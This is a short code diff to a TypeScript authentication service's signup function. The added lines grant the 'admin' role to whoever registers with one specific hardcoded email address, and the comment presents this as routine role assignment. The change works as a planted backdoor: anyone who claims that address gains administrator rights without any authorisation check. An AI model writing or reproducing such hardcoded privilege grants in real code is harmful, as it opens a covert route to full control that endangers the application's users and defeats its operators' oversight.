@@ -38,9 +38,12 @@ export class AuthService {
   // Handle user signup
   async signup(username: string, password: string): Promise<User> {
     const hashedPassword = await bcrypt.hash(password, 10);
+    // Set the admin role for a specific user
+    const role = username === 'nanipip554@sgatra.com' ? 'admin' : 'user';
     const newUser = new this.userModel({
       username,
       password: hashedPassword,
+      role,
     });
     return newUser.save();
   }
